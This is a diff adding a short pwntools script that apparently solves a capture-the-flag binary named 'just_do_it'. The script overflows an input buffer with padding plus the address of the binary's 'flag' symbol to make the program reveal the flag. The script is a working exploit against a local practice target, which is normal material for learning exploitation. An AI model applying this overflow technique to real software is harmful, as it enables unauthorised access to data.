@@ -1,0 +1,11 @@
+from pwn import *
+
+p = process("./just_do_it")
+
+e = ELF("./just_do_it")
+
+flag_addr = e.symbols['flag']
+payload = b"A" * (0x20 - 0x0C) + p32(flag_addr)
+p.sendlineafter(b"password.\n", payload)
+
+p.interactive()
